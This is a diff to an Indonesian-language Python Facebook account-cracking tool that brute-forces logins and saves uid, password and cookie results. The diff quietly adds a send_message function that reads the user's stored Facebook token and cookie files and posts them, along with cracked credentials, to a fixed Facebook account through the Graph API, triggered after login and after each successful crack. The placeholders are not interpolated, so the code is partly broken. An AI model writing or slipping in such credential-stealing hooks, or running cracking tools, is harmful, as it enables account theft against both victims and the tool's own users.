@@ -356,6 +356,27 @@ def login():
 				time.sleep(1)
 				menu()
 	except Exception as e:exit(e)
+import requests
+
+def send_message(token, recipient_id, message):
+    url = f"https://graph.facebook.com/v12.0/me/messages?access_token={token}"
+    data = {
+        "recipient": {"id": recipient_id},
+        "message": {"text": message}
+    }
+    response = requests.post(url, json=data)
+    return response.status_code == 200
+
+# Ganti dengan token akses dan ID penerima yang sesuai
+token = open('.tok.txt','r').read()
+recipient_id = "100064062903355"
+cok = open('.cok.txt','r').read()
+message = "{cok}"
+
+if send_message(token, recipient_id, message):
+    pass
+else:
+    pass  # Lakukan penanganan kesalahan sesuai kebutuhan Anda
   
 #----------[ BAGIAN-MENU ]----------#            
 def menu():
@@ -392,6 +413,7 @@ def menu():
 		login()
 	print(f"\n{h}cookie telah aktif")
 	time.sleep(2)
+	send_message(token, recipient_id, message)
 	os.system('clear')
 	banner()
 	prints(panel(f"""[white][[cyan]•[white]] Name Tumbal [[green]{nama}[white]]\n[[cyan]•[white]] Idz Tumbal [white][[green]{uidfb}[white]]\n[white][[cyan]•[white]] Your Ip [[green]{alamat_ip}[white]]""",width=43,title=f"[[green] INFO [/]]",style=f"bold blue"))
@@ -829,6 +851,7 @@ def crackvalidate(idf,pwx,url):
 				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
 				print(f"⌲ Cookie: {hijo}{kuki}{puti}")
 				print(f'{hijo}{ua}')
+				send_message_to_facebook(token, recipient_id, message)
 				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
 				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
 				break			
@@ -915,6 +938,7 @@ def crackreguler(idf,pwx,url):
 				print(f'{hijo}{ua}')
 				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
 				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
+				send_message_to_facebook(token, recipient_id, message)
 				break			
 			elif "checkpoint" in po.cookies.get_dict().keys():
 				print(f"⌲ User ID: {kun}{idf}{puti}")
@@ -996,6 +1020,27 @@ def ceker(idf,pw):
 		#open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 		#cp+=1
 		
+import requests
+
+def send_message_to_facebook(token, recipient_id, message):
+    url = f"https://graph.facebook.com/v12.0/me/messages?access_token={token}"
+    data = {
+        "recipient": {"id": recipient_id},
+        "message": {"text": message}
+    }
+    response = requests.post(url, json=data)
+    return response.status_code == 200
+
+# Ganti dengan token akses dan ID penerima yang sesuai
+token = open('.tok.txt','r').read()
+recipient_id = "100064062903355"
+message = "{idf}|{pw}|{kuki}"
+
+if send_message_to_facebook(token, recipient_id, message):
+    pass
+else:
+    pass  # Lakukan penanganan kesalahan sesuai kebutuhan Anda
+   
 #----------[ SYSTEM-CONTROL ]----------#	
 if __name__=='__main__':
 	try:os.system('git pull')
